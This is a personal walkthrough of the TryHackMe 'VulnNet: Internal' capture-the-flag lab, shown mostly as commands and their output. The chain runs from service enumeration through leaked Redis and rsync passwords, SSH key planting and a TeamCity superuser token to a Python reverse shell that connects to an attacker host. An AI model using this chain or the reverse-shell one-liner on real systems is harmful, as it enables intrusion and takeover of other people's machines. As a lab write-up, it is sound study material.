### Nmap

```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
|_  256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33407/tcp6  mountd
|   100005  1,2,3      48473/udp6  mountd
|   100005  1,2,3      54625/tcp   mountd
|   100005  1,2,3      56621/udp   mountd
|   100021  1,3,4      33209/tcp6  nlockmgr
|   100021  1,3,4      33495/udp6  nlockmgr
|   100021  1,3,4      41567/tcp   nlockmgr
|   100021  1,3,4      42772/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -6h10m01s, deviation: 1h09m16s, median: -5h30m02s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2023-09-10T16:44:51+02:00
| smb2-time: 
|   date: 2023-09-10T14:44:51
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```


### SMB

- listed anonymous smb shares
```
   │   ~/Desktop/THM ▓▒░ smbclient  -L \\\\10.10.33.21\\ -U anonymous

shares          Disk      VulnNet Business Shares
```

- found two directories in `shares`
```
temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
```

- found three files here
```
   │   ~/Desktop/THM/internal ▓▒░ cat services.txt                                                              ░▒▓ ✔ │ 01:52:33   
THM{0a09d51e488f5fa105d8d866a497440a}
```

 ```
    │   ~/Desktop/THM/internal ▓▒░ cat business-req.txt                                                          ░▒▓ ✔ │ 01:53:02   
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

third one was not the useful

### NFS

- check which files are shared on nfs using
```
   │   ~/Desktop/THM/internal ▓▒░ /usr/sbin/showmount -e 10.10.33.21                                          ░▒▓ 1 ✘ │ 02:05:33   
Export list for 10.10.33.21:
/opt/conf *
```

- mounted those nfs shared on my machine using
```
   │   ~/Desktop/THM/internal ▓▒░ sudo mount -t nfs 10.10.33.21:/opt/conf /tmp/mount/ -nolock 
```

- in it we get 
```
   │  /tmp/mount ▓▒░ ls -al                                                                                     ░▒▓ ✔ │ 02:07:52   
total 32
drwxr-xr-x 9 root root 4096 Feb  2  2021 .
drwxrwxrwt 1 root root 1148 Sep 11 02:07 ..
drwxr-xr-x 2 root root 4096 Feb  2  2021 hp
drwxr-xr-x 2 root root 4096 Feb  2  2021 init
drwxr-xr-x 2 root root 4096 Feb  2  2021 opt
drwxr-xr-x 2 root root 4096 Feb  2  2021 profile.d
drwxr-xr-x 2 root root 4096 Feb  2  2021 redis
drwxr-xr-x 2 root root 4096 Feb  2  2021 vim
drwxr-xr-x 2 root root 4096 Feb  2  2021 wildmid
```

 - in `redis/redis.conf` i found this `requirepass "B65Hx562F@ggAZ@F"`

```
# The filename where to dump the DB
dbfilename dump.rdb
```

- used this `   │  /tmp/mount ▓▒░ tree .`


### Redis

- used the writeup here

rescanned the redis port

```
   │   ~ ▓▒░ nmap -p 6379 10.10.146.124           
PORT     STATE SERVICE
6379/tcp open  redis
```

[[2.1 Redis commands]]

```
redis-cli -h 10.10.146.124 -p 6379 -a B65Hx562F@ggAZ@F
```

- connected to the redis database and got a interactive shell

- listed all the keys and also the flag

```
10.10.146.124:6379> KEYS *
1) "internal flag"
2) "int"
3) "authlist"
4) "marketlist"
5) "tmp"
10.10.146.124:6379> KEYS 1
(empty array)

10.10.146.124:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.146.124:6379>
```

[[2.2 Redis Commands 2 - interactive]]

- in the authlist i get this
```
10.10.146.124:6379> lrange authlist 0 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

- when decoded in `base64` i get this

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

```
rsync rsync://rsync-connect@10.10.146.124
```

https://www.tecmint.com/rsync-local-remote-file-synchronization-commands/
![[Pasted image 20230915030216.png]]


tried multiple commands but was getting error

```
rsync -azvh rsync-connect@10.10.146.124:/home/rsync-connect/user.txt user.txt
```

this one said wrong password, dont know why


- used the writeup here again as i was not getting it correct 

realized rsync nmap output

`873/tcp  open     rsync       (protocol version 31)`

``` wrieup command yntax
rsync -av --list-only rsync://$IP:873
```
this shows name of the folder hosted on `rsync`

- we had to make a temp file and copy all the `rsync remote files to our local machine`

```
rsync -av rsync://rsync-connect@10.10.146.124:873/files ./rsync
```

i used this command

copid the files and got the user flag

```
   │   ~/De/THM/internal/rsync/sys-internal ▓▒░ cat user.txt                                                              
THM{da7c20696831f253e0afaca8b83c07ab}
```

### Shell

- followed write up steps here, we can create and upload a ssh key pair to ssh into the machine
- created a ssh key pair using
```
   │   ~/Desktop/THM/internal ▓▒░ ssh-keygen -f ./id_rsa
```


writeup command to upload public key via rsync

```
rsync -ahv ./id_rsa.pub rsync://rsync-connect@$IP:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
```


 - rsync command to download file to local machine using
```
rsync -av rsync://rsync-connect@10.10.146.124:873/files ./rsync
```


- rsync command to upload file to remote machine using

```
rsync -ahv ./id_rsa.pub rsync://rsync-connect@10.10.146.124:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
```

- password `Hcg3HP67@TW@Bc72v`

- used writeup for user id - `sys-internal`

- we can now login to the machine using

```
   │   ~/Desktop/THM/internal ▓▒░ ssh sys-internal@10.10.146.124 -i id_rsa 
```

### Priv Esc


- found unusual file in root
```
drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity
```


- used writeup here

found out in the `Readme` file that Teamcity is running on port `8111`

now using [[SSH - port forwarding]] to get access to Teacmcity website

i run the command

```
   │   ~/Desktop/THM/internal ▓▒░ sudo ssh sys-internal@10.10.146.124 -i id_rsa -L 80:127.0.0.1:8111 
```

- on the website there is an options to run as super user and we get asked for a token, this must be somewhere in the `Teamcity directory` 

```
sys-internal@vulnnet-internal:/TeamCity$ find . -name *token* 2>/dev/null

./webapps/ROOT/WEB-INF/tags/admin/tokenDescription.tag
./webapps/ROOT/oauth/github/token.jsp
./webapps/ROOT/oauth/tfs/token.jsp
```

- Writeup
we can find the token in 

```
cat /TeamCity/logs/catalina.out
```


we use 

```
ys-internal@vulnnet-internal:/TeamCity$ cat /TeamCity/logs/catalina.out | grep token


[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8912911422753064824 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8912911422753064824 (use empty username with the token as the password to access the server)

```

- this worked
```
[TeamCity] Super user authentication token: 8912911422753064824 (use empty username with the
```

- writeup
Now we have access as the superuser, and we can simply go create a new project > build configuration > build step and add a python script for getting a reverse shell.

got stuck here will try again tomorrow


- this command for python was not working
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9992));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

https://www.youtube.com/watch?v=xKfTMWATNPM

used this for reference

- changed to
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9992));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

saving was taking very long time

- got a shell

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

- the flags
```
# cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
```

```
   │   ~/De/THM/internal/rsync/sys-internal ▓▒░ cat user.txt                                                              ░▒▓ ✔ │ 02:51:47   
THM{da7c20696831f253e0afaca8b83c07ab}
```